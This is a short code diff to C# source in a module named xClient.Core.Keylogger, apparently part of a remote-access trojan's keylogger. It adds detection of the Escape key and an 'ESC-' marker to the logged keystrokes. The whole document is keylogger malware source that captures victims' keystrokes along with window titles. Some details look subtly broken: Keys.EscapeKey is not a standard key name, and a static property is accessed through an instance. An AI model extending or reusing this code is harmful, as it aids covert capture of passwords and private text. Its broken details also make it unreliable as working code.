@@ -87,6 +87,14 @@ namespace xClient.Core.Keylogger
                 return Control.IsKeyLocked(Keys.CapsLock); //Returns true if Capslock is toggled on
             }
         }
+        
+        private static bool EscapeKey
+        {
+            get
+            {
+                return Convert.ToBoolean(GetAsyncKeyState(Keys.EscapeKey) & 0x8000); //Returns true if Escape is pressed
+            }
+        }
 
         private StringBuilder _logFileBuffer;
         private string _hWndTitle;
@@ -218,6 +226,7 @@ namespace xClient.Core.Keylogger
                                         ((k.ShiftKey)   ? "SHIFT-" : string.Empty) +
                                         ((k.ControlKey) ? "CTRL-"  : string.Empty) +
                                         ((k.AltKey)     ? "ALT-"   : string.Empty) +
+                                        ((k.EscapeKey)  ? "ESC-"   : string.Empty) +
                                         FromKeys(k.Value, k.ShiftKey, k.CapsLock)
                                         ));
                             }
